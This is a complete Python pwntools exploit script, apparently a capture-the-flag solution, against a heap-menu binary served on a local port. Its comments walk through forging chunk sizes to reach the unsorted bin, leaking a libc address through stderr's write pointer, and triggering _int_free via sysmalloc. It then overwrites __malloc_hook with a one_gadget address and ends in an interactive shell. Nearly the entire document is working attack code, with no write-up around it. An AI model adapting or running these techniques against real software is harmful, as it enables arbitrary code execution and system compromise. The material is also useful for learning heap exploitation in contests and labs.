from pwn import *



binpath = './pwn'
context.binary = binpath
context.terminal = ['tmux', 'split-w', '-h']


elf = ELF(binpath)
libc = elf.libc


gdbscript = '''
pwn
# b *0x400df1
# ignore 1 100
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
io = remote('localhost', 4088)


def debug(func):
    def wrapper(*args, **kwargs):
        print "{}({}, {})".format(func.__name__, str(args), str(kwargs))
        return func(*args, **kwargs)
    return wrapper


@debug
def alloc(size, data):
    io.recvuntil('> ')
    io.sendline('1')

    io.recvuntil('size: ')
    io.sendline(str(size))

    io.recvuntil('data: ')
    io.sendline(data[:size])


@debug
def edit(index, byte):
    io.recvuntil('> ')
    io.sendline('2')

    io.recvuntil('index: ')
    io.sendline(str(index))

    io.recvuntil('byte: ')
    io.sendline(str(byte))


@debug
def print_name():
    io.recvuntil('> ')
    io.sendline('4')

    io.recvuntil('pwner: ')
    name = io.recvline().rstrip('\n')

    return name


@debug
def delete():
    io.recvuntil('> ')
    io.sendline('3')


io.recvuntil('name: ')
io.sendline('hoge')

alloc(0x58, 'A' * 0x8)
delete()
alloc(0x68, 'B' * 0x8)
delete()

alloc(0x58, '\x00')
# these edits will overwrite the size of the chunk that will be allocated at alloc(0x68, 'C' * 0x8)
# from 0x70 to 0x500, which will not fit into tcache bins.
edit(0x58, 0x01)
edit(0x58 + 1, 0x05)


# size of fake next chunk
edit(0x58 + 0x500, 0x71)

# the PREV_IN_USE in 0x71 is telling that the next chunk of alloc(0x68, 'C' * 0x8)
# is used, so there is no need for unlink.
# if the 0x71 is 0x70 here the unlink procedure is called and the program fails
edit(0x58 + 0x500 + 0x70, 0x71)

# link fake sized chunk to unsorted bins
alloc(0x68, 'C' * 8)
delete()
# now there will be address to main_arena in heap area
# which can be leaked by overwriting _IO_write_ptr

alloc(0x58, 'C' * 8)
delete()
alloc(0x68, 'D' * 8)
delete()


def write_word(offset, word):
    for i, b in enumerate(word):
        edit(offset + i, str(ord(b)))

addr_stderr = 0x602040
alloc(0x58, 'E' * 8)
write_word(0x60, p64(addr_stderr))

alloc(0x68, 'consume1')
alloc(0x68, 'consume2')
alloc(0x68, '')


edit(0x109, 0xf0)
io.recvuntil('EEEEEEEE')
data = io.recv(8)
print hexdump(data)
addr_main_arena = u64(data)
print hex(addr_main_arena)
# addr_libc = addr_main_arena - 0x3ebca0
addr_libc = addr_main_arena - 0x3ec000

print "addr_libc = {}".format(hex(addr_libc))


io.sendline('1')

size = 0x80
io.recvuntil('size: ')
io.sendline(str(size))

io.recvuntil('data: ')
io.sendline(str(0))
for i in xrange(1, 1 + 28):
    alloc(0x80, str(i))
# adjust top's size so the sysmalloc will be called, which will eventually call _int_free
write_word(0x88, p64(0x71)) # don't forget PREV_IN_USE

alloc(0x80, 'sysmalloc to call _int_free')

for i in xrange(27):
    alloc(0x80, str(i))
write_word(0x88, p64(0x41))
alloc(0x80, 'sysmalloc to call _int_free again')

addr_malloc_hook = addr_libc + libc.symbols['__malloc_hook']
alloc(0x48, 'E' * 8)
write_word(0x20030, p64(addr_malloc_hook))

addr_one_gadget = addr_libc + 0x4f322
alloc(0x18, 'consume again')
alloc(0x18, p64(addr_one_gadget))

# call one_gadget
io.recvuntil('> ')
io.sendline('1')

io.recvuntil('size: ')
io.sendline(str(size))


io.interactive()
